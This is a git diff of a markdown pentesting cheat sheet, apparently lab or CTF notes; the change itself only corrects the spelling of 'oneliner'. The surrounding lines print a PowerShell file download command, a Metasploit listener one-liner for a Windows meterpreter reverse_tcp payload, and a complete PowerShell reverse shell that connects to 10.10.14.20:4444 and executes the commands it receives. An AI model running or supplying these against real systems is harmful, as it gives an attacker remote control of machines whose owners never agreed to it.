@@ -32,7 +32,7 @@ Powershell Invoke-WebRequest -Uri IPNUMMER:PORT/FILNAMN -OutFile FILENAME
 
 ### [](#header-3)Listener in Metasploit
 
-Quick onliner for setting up a listener in Metasploit for reverse shell for Windows.
+Quick oneliner for setting up a listener in Metasploit for reverse shell for Windows.
 
 ```
 sudo msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.10; set lport 4444; set ExitOnSession false; exploit -j"
@@ -42,7 +42,7 @@ sudo msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/revers
 
 ### [](#header-3)Powershell reverse shell
 
-A powershell onlineliner for a reverse shell.
+A powershell oneliner for a reverse shell.
 
 ```
 $client = New-Object System.Net.Sockets.TCPClient("10.10.14.20",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
